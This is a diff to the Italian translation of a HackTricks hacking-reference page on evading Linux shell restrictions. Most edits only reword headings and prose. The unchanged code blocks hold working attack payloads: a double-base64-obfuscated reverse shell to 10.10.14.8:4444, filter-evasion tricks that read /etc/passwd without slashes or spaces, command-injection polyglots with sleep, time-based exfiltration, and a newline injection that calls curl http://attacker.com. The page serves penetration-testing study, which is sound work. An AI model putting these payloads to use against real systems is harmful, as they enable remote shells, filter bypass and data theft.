@@ -1,16 +1,16 @@
-# Eludere le restrizioni di Linux
+# Bypass Linux Restrictions
 
 {% hint style="success" %}
-Impara e pratica l'Hacking su AWS: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Impara e pratica l'Hacking su GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Impara e pratica AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Impara e pratica GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Sostieni HackTricks</summary>
+<summary>Supporta HackTricks</summary>
 
 * Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
 * **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Condividi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.
+* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.
 
 </details>
 {% endhint %}
@@ -18,20 +18,20 @@ Impara e pratica l'Hacking su GCP: <img src="/.gitbook/assets/grte.png" alt="" d
 <figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Usa [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=bypass-bash-restrictions) per costruire facilmente e **automatizzare flussi di lavoro** supportati dagli strumenti comunitari **più avanzati** al mondo.\
-Ottieni l'accesso oggi:
+Usa [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=bypass-bash-restrictions) per costruire e **automatizzare flussi di lavoro** alimentati dagli **strumenti** della comunità **più avanzati** al mondo.\
+Ottieni accesso oggi:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=bypass-bash-restrictions" %}
 
-## Elusioni delle Limitazioni Comuni
+## Bypass delle Limitazioni Comuni
 
-### Shell Inversa
+### Reverse Shell
 ```bash
 # Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
 echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
 # echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
 ```
-### Shell inversa breve
+### Short Rev shell
 ```bash
 #Trick from Dikline
 #Get a rev shell with
@@ -39,7 +39,7 @@ echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|
 #Then get the out of the rev shell executing inside of it:
 exec >&0
 ```
-### Ignorare percorsi e parole vietate
+### Bypass Paths e parole vietate
 ```bash
 # Question mark binary substitution
 /usr/bin/p?ng # /usr/bin/ping
@@ -99,7 +99,7 @@ mi # This will throw an error
 whoa # This will throw an error
 !-1!-2 # This will execute whoami
 ```
-### Ignora spazi vietati
+### Bypass forbidden spaces
 ```bash
 # {form}
 {cat,lol.txt} # cat lol.txt
@@ -126,12 +126,12 @@ echo "ls\x09-l" | bash
 $u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
 uname!-1\-a # This equals to uname -a
 ```
-### Ignorare backslash e slash
+### Bypass backslash e slash
 ```bash
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```
-### Ignorare i tubi
+### Bypass pipes
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
@@ -145,28 +145,28 @@ cat `xxd -r -p <<< 2f6574632f706173737764`
 xxd -r -ps <(echo 2f6574632f706173737764)
 cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 ```
-### Ignora gli IP
+### Bypass IPs
 ```bash
 # Decimal IPs
 127.0.0.1 == 2130706433
 ```
-### Esfiltrazione dei dati basata sul tempo
+### Esfiltrazione di dati basata sul tempo
 ```bash
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 ```
-### Ottenere caratteri dalle variabili di ambiente
+### Ottenere caratteri dalle variabili d'ambiente
 ```bash
 echo ${LS_COLORS:10:1} #;
 echo ${PATH:0:1} #/
 ```
 ### Esfiltrazione dei dati DNS
 
-Potresti utilizzare **burpcollab** o [**pingb**](http://pingb.in) ad esempio.
+Puoi usare **burpcollab** o [**pingb**](http://pingb.in) per esempio.
 
 ### Builtins
 
-Nel caso in cui non sia possibile eseguire funzioni esterne e si abbia accesso solo a un **set limitato di builtins per ottenere RCE**, ci sono alcuni trucchi utili per farlo. Di solito **non sarà possibile utilizzare tutti** i **builtins**, quindi dovresti **conoscere tutte le tue opzioni** per cercare di eludere la prigione. Idea da [**devploit**](https://twitter.com/devploit).\
-Prima di tutto controlla tutti i [**shell builtins**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**.** Ecco alcune **raccomandazioni**:
+Nel caso in cui non puoi eseguire funzioni esterne e hai solo accesso a un **insieme limitato di builtins per ottenere RCE**, ci sono alcuni trucchi utili per farlo. Di solito **non sarai in grado di usare tutti** i **builtins**, quindi dovresti **conoscere tutte le tue opzioni** per cercare di bypassare la prigione. Idea da [**devploit**](https://twitter.com/devploit).\
+Prima di tutto controlla tutti i [**builtins della shell**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**.** Poi qui hai alcune **raccomandazioni**:
 ```bash
 # Get list of builtins
 declare builtins
@@ -223,7 +223,7 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 ```
-### Ignorare le regex potenziali
+### Bypass potenziali regex
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
@@ -315,15 +315,15 @@ ln /f*
 'sh x'
 'sh g'
 ```
-## Bypass di Lettura-Sola/Esecuzione-Nessuna/Esecuzione-Distroless
+## Bypass di Read-Only/Noexec/Distroless
 
-Se ti trovi all'interno di un filesystem con le **protezioni di sola lettura e noexec** o addirittura in un container distroless, ci sono comunque modi per **eseguire binari arbitrari, persino una shell!:**
+Se ti trovi all'interno di un filesystem con le **protezioni read-only e noexec** o anche in un container distroless, ci sono ancora modi per **eseguire binari arbitrari, anche una shell!:**
 
 {% content-ref url="bypass-fs-protections-read-only-no-exec-distroless/" %}
 [bypass-fs-protections-read-only-no-exec-distroless](bypass-fs-protections-read-only-no-exec-distroless/)
 {% endcontent-ref %}
 
-## Bypass di Chroot e Altre Prigioni
+## Bypass di Chroot e altre Jails
 
 {% content-ref url="../privilege-escalation/escaping-from-limited-bash.md" %}
 [escaping-from-limited-bash.md](../privilege-escalation/escaping-from-limited-bash.md)
@@ -339,14 +339,14 @@ Se ti trovi all'interno di un filesystem con le **protezioni di sola lettura e n
 <figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Utilizza [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=bypass-bash-restrictions) per costruire facilmente e **automatizzare flussi di lavoro** supportati dagli strumenti della comunità più avanzati al mondo.\
-Ottieni l'Accesso Oggi:
+Usa [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=bypass-bash-restrictions) per costruire e **automatizzare flussi di lavoro** alimentati dagli **strumenti comunitari più avanzati** al mondo.\
+Accedi Oggi:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=bypass-bash-restrictions" %}
 
 {% hint style="success" %}
-Impara e pratica l'Hacking su AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Impara e pratica l'Hacking su GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Impara e pratica Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Impara e pratica Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
@@ -354,7 +354,7 @@ Impara e pratica l'Hacking su GCP: <img src="/.gitbook/assets/grte.png" alt="" d
 
 * Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
 * **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di Github.
+* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repository github.
 
 </details>
 {% endhint %}
